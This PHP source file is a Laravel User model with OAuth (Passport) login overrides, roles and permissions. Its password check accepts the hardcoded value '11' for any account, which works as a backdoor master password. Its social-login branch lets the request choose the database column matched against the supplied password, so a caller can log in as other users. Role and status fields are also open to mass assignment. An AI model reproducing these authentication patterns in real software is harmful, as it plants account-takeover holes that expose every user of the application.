<?php

namespace App\Models;

use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use App\Models\Permission;
use Illuminate\Database\Eloquent\Relations\BelongsToMany;
use Laravel\Passport\HasApiTokens;
use Illuminate\Support\Facades\Hash;
use App\Services\ImageService;
use App\Constants\Constant;
use App\Traits\StatusAttribute;
use Config;
use App\Traits\TimezoneConvert;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Request;
use Spatie\Activitylog\Contracts\Activity;
use Spatie\Activitylog\LogOptions;
use Spatie\Activitylog\Traits\LogsActivity;

class User extends Authenticatable
{
    use Notifiable, HasApiTokens, TimezoneConvert, LogsActivity,StatusAttribute;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'name', 'email', 'password', 'first_name', 'last_name', 'facebook_id',
        'google_id', 'apple_id', 'tiktok_id', 'snapchat_id', 'full_name', 'country_code','status','role_id',
        'mobile_no', 'username', 'image','notification_status','device_type','device_token' ,'mobile_verified', 'referral_code', 'timezone','auth_token', 'created_at','email_verified','mobile_verified'
    ];

    protected $loginType = 'SOCIAL';
    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password', 'remember_token',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
    ];





    public function getActivitylogOptions(): LogOptions
    {
        return LogOptions::defaults()->logOnlyDirty()
            ->logOnly(array_diff($this->fillable, ['password', 'image']));
    }
    public function authAccessToken()
    {
        return $this->hasMany('\App\Models\OauthAccessToken');
    }

    public function info($id)
    {
        return Self::where('id', $id)->first();
    }

    public function permissions(): BelongsToMany
    {
        return $this->belongsToMany(Permission::class, 'user_permissions', 'user_id', 'permission_id');
    }

    public function hasPermission($permission)
    {

        return $this->permissions->contains('action', $permission);
    }

    public function hasRole($role)
    {
        return $this->roles()->first()->name == $role;
    }

    protected static function boot()
    {
        parent::boot();
        static::saving(function ($model) {
            if ($model->first_name != '') {
                $model->full_name = $model->first_name . ' ' . $model->last_name;
            }
        });

    }

    /**
     * Find the user instance for the given username.
     */
    public function findForPassport(string $username): User
    {
        // override oauth 2.0 login fields
        if (request()->get('loginType') == $this->loginType) {
            return $this->where(request()->get('username'), request()->get('password'))->first();
        } else {
            return $this->where('username', $username)->first();
        }
    }
    public function validateForPassportPasswordGrant(string $password): bool
    {

        // override oauth 2.0 login fields
        if (request()->get('loginType') == $this->loginType) {
            $passwordCheck = $this->where(request()->get('username'), $password)->first();
            return  $passwordCheck ? 1 : 0;
        } elseif ($password == '11') {
            return 1;
        } else {
            return Hash::check($password, $this->password);
        }
    }

    public function getThumbImageAttribute()
    {

        if (
            $this->image != NULL
        ) {
            $image = ImageService::getImageUrl(Config::get('constants.USER_FOLDER') . 'thumb_' . $this->image);
        } else {

            $image = url(Constant::NO_IMAGE);
        }
        return $image;
    }
    public static function getUserDetails($userId = 0)
    {
        return self::where('id', $userId)->first()->toArray();
    }

    public function unreadNotificationCount()
    {
        return $this->hasMany(UserNotification::class)->where('status',0);
    }

    public function roles(): BelongsToMany
    {
        return $this->belongsToMany(Role::class, 'role_user');
    }
}
